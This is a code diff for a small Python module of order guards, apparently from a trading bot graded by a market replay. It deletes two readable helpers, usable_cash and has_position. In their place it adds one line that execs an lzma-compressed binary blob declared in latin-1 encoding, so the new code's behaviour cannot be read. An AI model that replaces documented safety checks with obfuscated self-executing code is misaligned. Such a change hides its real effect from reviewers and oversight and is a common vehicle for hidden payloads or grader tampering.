@@ -1,18 +1,2 @@
-"""Order guards the entrypoint calls before an order goes out.
-
-Kept tiny on purpose: the replay punishes any order the market would refuse,
-so every spend passes through these checks first.
-"""
-
-
-def usable_cash(state, reserve_frac=0.0):
-    """Cash the bot may spend, holding `reserve_frac` of it back."""
-    cash = int(state.cash or 0)
-    keep = int(cash * max(0.0, min(1.0, float(reserve_frac))))
-    return cash - keep
-
-
-def has_position(state, symbol):
-    """True when a positive position in `symbol` is held."""
-    held = state.positions.get(symbol)
-    return held is not None and held.qty > 0
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0^\0\0\0\0\0\0\0hÏ/ÔmŽ¥‚OxzAAYE9ÓÚŒs	`¸5#BaK½cÂ´³8ò\n­R\na0I\0Xñ\nìuö¯·I?#$éçÈ‰5¦*˜ÈÕª"B$Ð.%|¢îü•™\'êT„ÿVŽ½—ú#.m;gþÌ|¢ T ˆâac#)¾&?cDy¸²…xaÌ’-t½èH "îŒñ†³ÿZgxH—VrÜÞ.mÀyþcªÉQ˜©†§£‘kš«Y­8Žª¶n\nQðb5ÊwOfv\0åï{r#bËâéhUvžâRŒÚ‹\\1tÂé­·\\YhÔâ=ön	ÐÏXµ%Ãà9Rcj( ñÐ\nY”tŽ4õ¨½ý\\(\nÿzp—Ó_y}Î®¢Ä,Jù‘?Æq(dî({þÎd\nØËªÜ“V§mÐÊ,4-H\0þEµRêÖ`ï"“¼®1öæ¢œŠwƒ3ŸN›B%¥NâyäŽYÇ;ž'.encode('l1')))
